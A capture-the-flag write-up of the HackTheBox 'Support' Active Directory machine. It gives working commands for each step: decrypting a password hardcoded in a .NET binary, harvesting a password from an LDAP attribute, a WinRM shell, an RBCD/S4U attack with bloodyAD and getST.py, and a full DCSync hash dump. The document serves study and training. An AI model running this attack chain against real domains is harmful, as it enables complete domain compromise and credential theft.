---
layout: writeup
lang: en
permalink: /en/writeups/support/
title: "Support"
ref: support
date: 2026-06-01
bare: true
platform: HTB
os: Windows
difficulty: Easy
tags: [win, AD, ldap, rbcd, kerberos, privesc]
txt: /writeups-files/support-en.txt
---

# Writeup — Support (HackTheBox)

OS: Windows Server 2022 (Active Directory)
Difficulty: Easy
Date: 18 June 2026

---

## Summary

Active Directory machine. It starts from an anonymously accessible SMB share containing an internal .NET tool. From the binary you extract an encrypted password and its key, decrypt it and obtain the credentials of the ldap account. From there: complete LDAP enumeration, recovery of the support account's password hidden in an info field, a WinRM shell, and the final privilege escalation through the write right on the DC's computer object (RBCD), which leads to impersonating Administrator and compromising the entire domain.

Chain: anonymous SMB → credential extraction from a .NET binary → ldap → password in the LDAP info field → WinRM support → WRITE on DC$ → RBCD → S4U → Administrator.

---

## additional tools and methodology

an llm was used during the session: for looking up CVE details, interpreting raw output, suggesting unexplored vectors when stuck and detailed explanation of technical concepts. the execution and the operational decisions were mine. the writeup was written by me and later cleaned up with the same tool.

---

## Preface

This box is rated Easy but the first part (extracting and decrypting the password from the binary) took several fruitless attempts before I understood the encryption mechanism. The escalation part on the other hand was linear once the write right on the DC was identified. The writeup documents the failed attempts too because they are the most useful part, in particular the long series of dead ends attempted before finding the RBCD vector.

---

## Phase 1 — Reconnaissance

Initial port scan focused on SMB and then share enumeration:

nmap -Pn -p445 &#45;&#45;script smb-os-discovery,smb-enum-shares,smb-enum-users 10.129.20.89

Host reachable. A non-standard share appears: support-tools, accessible anonymously. AD environment confirmed. Domain: support.htb, DC: dc.support.htb.

/etc/hosts setup and clock synchronisation (needed on every respawn):

sudo sh -c 'echo "10.129.X.X dc.support.htb support.htb DC" >> /etc/hosts'
sudo ntpdate 10.129.X.X

---

## Phase 2 — Anonymous share and binary analysis

Anonymous access to the share and download of the contents:

smbclient //10.129.20.89/support-tools -N
mask ""
recurse ON
prompt OFF
mget *

Relevant files: UserInfo.exe.zip, putty.exe, WiresharkPortable, etc. The only interesting one is UserInfo.exe.zip, a custom internal tool.

Unzipped and analysed. It's a .NET executable. First pass with strings to get oriented:

strings UserInfo.exe &#124; grep -iE "password&#124;ldap&#124;key"

References to enc_password, LdapQuery, getPassword. The binary queries LDAP using hardcoded, encrypted credentials. I disassemble with monodis to read the fields:

monodis &#45;&#45;output=userinfo.il UserInfo.exe

The two key values extracted:

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = "armando"

---

## Phase 3 — Decrypting the password (with the failures)

The encryption mechanism wasn't obvious from the name. Several fruitless attempts before understanding the scheme:

### Attempts 1 and 2 — standard symmetric ciphers

Tried AES-256 in ECB and CBC mode using "armando" as the key. Non-ASCII output, random bytes. Wrong scheme.

### Attempt 3 — RC4

Tried RC4 with the same key. Here too, unreadable binary output.

### Solution — XOR with the key and a fixed operation

Rereading the disassembly the flow was: base64 decode of enc_password, then XOR of every byte with the key "armando" and with a constant value (0xDF). Replicated in Python:

enc = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"
out = bytes(enc[i] ^ key[i % len(key)] ^ 0xDF for i in range(len(enc)))

Result: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz — the password of the ldap account.

---

## Phase 4 — LDAP enumeration

With ldap's credentials, access to the share confirmed and then complete LDAP enumeration:

ldapsearch -x -H ldap://10.129.20.89 -D "support\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(objectClass=user)" sAMAccountName

21 users enumerated (Administrator, Guest, krbtgt, ldap, support, smith.rosario, hernandez.stanley, and others). I look for passwords in non-standard fields. The description field contains nothing, but scanning the attributes of the support account the info field shows up:

ldapsearch -x -H ldap://10.129.20.89 -D "support\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(sAMAccountName=support)" info

info field: Ironside47pleasure40Watchful — the password of the support account, left in plain text in a forgotten attribute.

---

## Phase 5 — WinRM shell as support

support is a member of Remote Management Users, so WinRM is available:

evil-winrm -i 10.129.20.89 -u support -p 'Ironside47pleasure40Watchful'

Shell obtained. User flag on support\Desktop.

---

## Phase 6 — Hunting the escalation vector (with all the failures)

This is the phase that took the most time. support isn't in any privileged group (only Domain Users and Shared Support Accounts), so I tried a long series of vectors, almost all of them failed:

### Local privileges

whoami /all showed only SeMachineAccountPrivilege, SeChangeNotifyPrivilege, SeIncreaseWorkingSetPrivilege. SeMachineAccountPrivilege means support can create computer accounts — noted but not yet connected to the final vector.

### winPEAS

winPEAS64.exe flagged a GenericAll on Administrator, which turned out to be a false positive: verification with PowerView showed SecurityIdentifier S-1-5-18 (local SYSTEM), not exploitable.

### Administrator password reset attempts (all failed)

- net user Administrator NewPass /domain → access denied
- Set-DomainUserPassword via PowerView → access denied
- rpcclient setuserinfo2 → NT_STATUS_ACCESS_DENIED

### Direct DCSync (failed)

impacket-secretsdump as support → DRSR SessionError, ERROR_DS_DRA_BAD_DN. support doesn't have replication rights.

### Kerberoasting and AS-REP Roasting (both empty)

GetUserSPNs.py → No entries found, no SPN in the domain. GetNPUsers.py → no user with DONT_REQUIRE_PREAUTH. Both vectors closed.

### GPO and SYSVOL (no permissions)

Checked the permissions on the GPOs: write only for Domain Admins, Enterprise Admins and SYSTEM. Write test on SYSVOL → UnauthorizedAccessException.

---

## Phase 7 — RBCD and final access

The correct vector emerges by enumerating support's write rights over the AD objects with bloodyAD:

bloodyAD &#45;&#45;host 10.129.230.181 -d support.htb -u support -p 'Ironside47pleasure40Watchful' get writable

Revealing output: support has DACL: WRITE on the object CN=DC,OU=Domain Controllers (the DC's computer account). This, combined with the SeMachineAccountPrivilege seen earlier, allows a complete Resource-Based Constrained Delegation attack.

Step 1 — I create a computer account under my control:

bloodyAD &#45;&#45;host 10.129.230.181 -d support.htb -u support -p 'Ironside47pleasure40Watchful' add computer fakepc 'Pass123!'

Step 2 — I configure RBCD on DC$ delegating to my fakepc (note: the sAMAccountName requires the trailing $, the first attempt without the $ failed with NoResultError):

bloodyAD &#45;&#45;host 10.129.230.181 -d support.htb -u support -p 'Ironside47pleasure40Watchful' add rbcd 'DC$' 'fakepc$'

Output: fakepc$ can now impersonate users on DC$ via S4U2Proxy.

Step 3 — S4U to obtain a service ticket as Administrator towards the DC:

getST.py -spn 'cifs/dc.support.htb' -impersonate Administrator -dc-ip 10.129.230.181 'support.htb/fakepc$:Pass123!'

Ticket saved. I export it and get the shell. A snag here: wmiexec was returning No route to host because /etc/hosts contained a leftover line from a previous respawn with an old IP for dc.support.htb. Removed the stale line:

sudo sed -i '/10.129.20.89/d' /etc/hosts
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
wmiexec.py -k -no-pass support.htb/Administrator@dc.support.htb

Shell as Administrator obtained. Root flag on Administrator\Desktop.

To confirm the impact, a complete DCSync of NTDS.DIT:

secretsdump.py -k -no-pass support.htb/Administrator@dc.support.htb -just-dc

Dump of every hash in the domain, krbtgt included. Worth noting: all the standard users share the same NT hash, a sign of accounts created en masse with the same password.

---

## Full chain

anonymous SMB share → UserInfo.exe (.NET binary)
→ extraction of enc_password + key → XOR decryption → ldap credentials
→ LDAP enumeration → support password in the info field
→ WinRM as support
→ bloodyAD: WRITE on DC$ (DACL)
→ computer account creation + RBCD on DC$
→ S4U2Proxy → Administrator ticket
→ wmiexec → Administrator → root
→ DCSync NTDS.DIT (impact on the entire domain)

---

## Lessons learned

When a password is encrypted in a binary with a hardcoded key, don't assume a standard cipher straight away. Reading the disassembly and replicating the exact sequence of operations is faster than blindly trying AES/RC4 with every mode.

Passwords left in non-standard LDAP attributes (info, description) are a classic: you should always enumerate every attribute of an account, not just the obvious ones.

The escalation vector wasn't in the local privileges nor in the group memberships, but in a single write right on an AD object. As soon as an account has SeMachineAccountPrivilege, check immediately with bloodyAD which objects it has WRITE on: if there's write access on a DC's computer account, RBCD is almost immediate. I would have saved hours if I had enumerated the DACL rights before attempting password resets and roasting.

---

## Tools used

nmap, smbclient, monodis, strings, Python, ldapsearch, evil-winrm, bloodyAD, getST.py, wmiexec.py, secretsdump.py, winPEAS, PowerView

<div class="writeup-image">
  <img src="/assets/writeups/support.png" alt="Proof of pwn">
  <div class="img-caption">Proof of pwn</div>
</div>
